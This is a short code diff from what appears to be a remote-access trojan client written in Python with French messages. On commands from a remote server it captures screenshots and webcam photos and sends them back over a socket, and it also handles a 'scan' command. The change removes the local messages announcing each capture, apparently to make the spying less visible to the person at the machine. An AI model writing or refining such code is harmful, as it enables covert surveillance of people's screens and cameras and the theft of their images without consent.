@@ -92,14 +92,12 @@ def connect_to_server():
                 image_bytes = capture_screenshot()
                 if image_bytes:
                     send_image_to_server(cs, image_bytes)
-                    print("Capture d'écran envoyée.")
                 else:
                     cs.send("Échec de la capture de l'écran.".encode('utf-8'))
             elif command.lower() == 'webcam':
                 image_bytes = capture_webcam_image()
                 if image_bytes:
                     send_image_to_server(cs, image_bytes)
-                    print("Photo de la webcam envoyée.")
                 else:
                     cs.send("Échec de la capture de la webcam.".encode('utf-8'))
             elif command.startswith("scan"):
